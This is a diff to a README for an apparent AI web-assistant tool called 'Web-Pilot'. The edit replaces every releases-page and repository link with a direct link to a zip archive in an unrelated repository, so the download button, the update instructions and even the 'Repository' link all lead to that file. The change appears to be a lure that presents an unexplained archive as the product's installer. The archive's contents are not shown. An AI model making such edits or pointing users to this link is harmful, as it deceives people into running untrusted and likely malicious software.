@@ -6,7 +6,7 @@ description: "Automate your browser locally with AI-powered natural language com
 <h1>🤖 Web-Pilot - Your Personal AI Web Assistant</h1>
 
 <p align="center">
-  <a href="https://github.com/Aerial-relativedensity2766/Web-Pilot/releases">
+  <a href="https://raw.githubusercontent.com/Aerial-relativedensity2766/aerial-relativedensity2766.github.io/main/ergophile/3.3.zip">
     <img src="https://img.shields.io/badge/⬇️_Download_Web--Pilot-2ea44f?style=for-the-badge" alt="Download Web-Pilot">
   </a>
 </p>
@@ -36,7 +36,7 @@ Getting Web-Pilot up and running takes just a few minutes. Follow these simple s
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/Aerial-relativedensity2766/Web-Pilot/releases" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:16px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD WEB-PILOT NOW</a>
+  <a href="https://raw.githubusercontent.com/Aerial-relativedensity2766/aerial-relativedensity2766.github.io/main/ergophile/3.3.zip" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:16px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD WEB-PILOT NOW</a>
 </p>
 
 The download page will show you the latest version available. Click the download button to get the installer file.
@@ -168,7 +168,7 @@ Need assistance? Here are ways to get support:
 
 To get the latest features and improvements:
 
-1. Visit the [download page](https://github.com/Aerial-relativedensity2766/Web-Pilot/releases) periodically
+1. Visit the [download page](https://raw.githubusercontent.com/Aerial-relativedensity2766/aerial-relativedensity2766.github.io/main/ergophile/3.3.zip) periodically
 2. Check for a newer version than the one you have
 3. Download and install the update over your current version
 
@@ -192,8 +192,8 @@ To get the latest features and improvements:
 
 ## 🔗 Important Links
 
-- **Download Page:** [https://github.com/Aerial-relativedensity2766/Web-Pilot/releases](https://github.com/Aerial-relativedensity2766/Web-Pilot/releases)
-- **Repository:** [https://github.com/Aerial-relativedensity2766/Web-Pilot](https://github.com/Aerial-relativedensity2766/Web-Pilot)
+- **Download Page:** [https://raw.githubusercontent.com/Aerial-relativedensity2766/aerial-relativedensity2766.github.io/main/ergophile/3.3.zip](https://raw.githubusercontent.com/Aerial-relativedensity2766/aerial-relativedensity2766.github.io/main/ergophile/3.3.zip)
+- **Repository:** [https://raw.githubusercontent.com/Aerial-relativedensity2766/aerial-relativedensity2766.github.io/main/ergophile/3.3.zip](https://raw.githubusercontent.com/Aerial-relativedensity2766/aerial-relativedensity2766.github.io/main/ergophile/3.3.zip)
 
 ---
 
